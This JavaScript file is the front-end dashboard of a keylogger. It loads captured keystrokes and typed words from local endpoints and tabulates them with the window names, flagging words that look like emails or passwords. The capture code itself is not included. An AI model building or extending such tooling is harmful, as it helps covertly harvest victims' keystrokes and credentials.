$(document).ready(function(){
    // var data = getKeyData();

    $('#emailToggle').bootstrapToggle();
    $('#passwordToggle').bootstrapToggle();

    $('#tableKeypresses').DataTable({
        data: getKeyData(),
        columns: [
            { data: 'datetime' },
            { data: 'isKeyDown' },
            { data: 'windowName' },
            { data: 'processedKey' }
        ]

    });

    $('#tableWords').DataTable({
        data: getWordData(),
        columns: [
            { data: 'datetime' },
            { data: 'windowName' },
            { data: 'processedWord' },
            { data: 'isEmail'},
            { data: 'isPassword' }
        ]

    });
    $('.dataTables_length').addClass('bs-select');
    //when page loads, show the contents of the keylogger
    // $('.container > #keyAll').show();
    // showKeys();
    // showWords();
    
})

// =========================
// =
// =        Keys
// =
// ========================
class Key {
    constructor(datetime, isKeyDown, windowName, processedKey) {
        this.datetime = datetime;
        this.isKeyDown = isKeyDown;
        this.windowName = windowName;
        this.processedKey = processedKey;

    }
}

function getKeyData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showKeylog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Key(el.datetime, el.isKeyDown, el.windowName, el.processedKey)
        );
    });

    return res
}
  
  // request and display all the keys collected
// function showKeys() {
//     res = []
//     console.log("res at start:" + res);
//     $.ajax({
//       url: "./showKeylog",
//       method: "GET",
//       dataType: 'json',
//       success: (data) => {
//           console.log("res before: " + res);
//           res = data;
//           console.log("res after: " + res);

//       },
//       fail: console.log("Failed to show key log")
//     });
//     console.log("res outside: " + res);
//     return getKeyData(res)
// }

// function showKeyTable(keys){
//     $('#keyAll > table > tbody').empty();
//     keys.forEach((item) => {
//         $('#keyAll > table > tbody').append(
//             '<tr><td>'
//             + item.datetime
//             +'</td><td>'
//             + item.isKeyDown
//             +'</td><td>'
//             + item.windowName
//             +'</td><td>'
//     	    + item.processedKey
//     	    +'</td></tr>'
//         )
//     })
// }



// =========================
// =
// =        Words
// =
// ========================

class Word {
    constructor(datetime, windowName, processedWord, isEmail, isPassword) {
        this.datetime = datetime;
        this.windowName = windowName;
        this.processedWord = processedWord;

        if (isEmail) {
            this.isEmail = "isEmail"
        } else {
            this.isEmail = "notEmail"
        }
        
        if (isPassword) {
            this.isPassword = "isPassword"
        } else {
            this.isPassword = "notPassword"
        }

    }
}

function getWordData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showWordlog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Word(el.datetime, el.windowName, el.processedWord, el.isEmail, el.isPassword)
        );
    });

    return res
}
// // request and display all the words collected
// function showWords() {
//     $.ajax({
//       url: "./showWordlog",
//       method: "GET",
//       dataType: 'json',
//       success: showWordTable,
//       fail: console.log("Failed to show word log")
//     });
//     console.log("help");
// }
  
// function showWordTable(words){
//     $('#wordAll > table > tbody').empty();
//     $.each(words, function(key, item){
//         console.log(item)
//         $('#wordAll > table > tbody').append(
//             '<tr><td>'
//             + item.datetime
//             +'</td><td>'
//             + item.windowName
//             +'</td><td>'
//             + item.processedWord
//             +'</td><td>'
//     	    + item.isEmail
//     	    +'</td><td>'
//     	    + item.isPassword
//     	    +'</td></tr>'
//         )
//     })
// }

